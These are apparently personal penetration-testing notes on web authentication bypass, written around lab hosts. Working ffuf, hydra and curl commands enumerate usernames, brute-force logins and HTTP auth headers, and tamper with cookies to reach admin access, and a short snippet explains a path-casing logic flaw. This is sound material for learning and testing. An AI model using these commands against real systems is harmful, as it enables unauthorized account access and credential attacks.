---
title: Authentication bypass
source_url: https://notes.incendium.rocks/pentesting-notes/web/authentication-bypass
fetched_at: 2026-09-20T01:23:21Z
license: unspecified
category: web
---
## Username Enumeration

A helpful exercise to complete when trying to find authentication vulnerabilities is creating a list of valid usernames, which we'll use later in other tasks.

### **Automated with ffuf:**

```bash
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u <http://10.10.83.53/customers/signup> -mr "username already exists"
```

### **Brute forcing passwords with username list and password list with ffuf:**

```bash
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u <http://10.10.83.53/customers/login> -fc 200
```

## Logic flaw

Example:

```php
if( url.substr(0,6) === '/admin') {
    # Code to check user is an admin
} else {
    # View Page
}
```

Because the above PHP code example uses three equals signs (===), it's looking for an exact match on the string, including the same letter casing. The code presents a logic flaw because an unauthenticated user requesting **/adMin** will not have their privileges checked and have the page displayed to them, totally bypassing the authentication checks.

## Cookie tampering

Examining and editing the cookies set by the web server during your online session can have multiple outcomes, such as unauthenticated access, access to another user's account, or elevated privileges.

```bash
curl -H "Cookie: logged_in=true; admin=false" <http://10.10.83.53/cookie-test>
```

```bash
curl -H "Cookie: logged_in=true; admin=true" <http://10.10.83.53/cookie-test>
```

<https://jwt.io/>

***

## HTTP authentication header bruteforce

```bash
hydra -l rascal -P ~/operations/rockyou.txt 10.10.31.86 http-head / -I
```
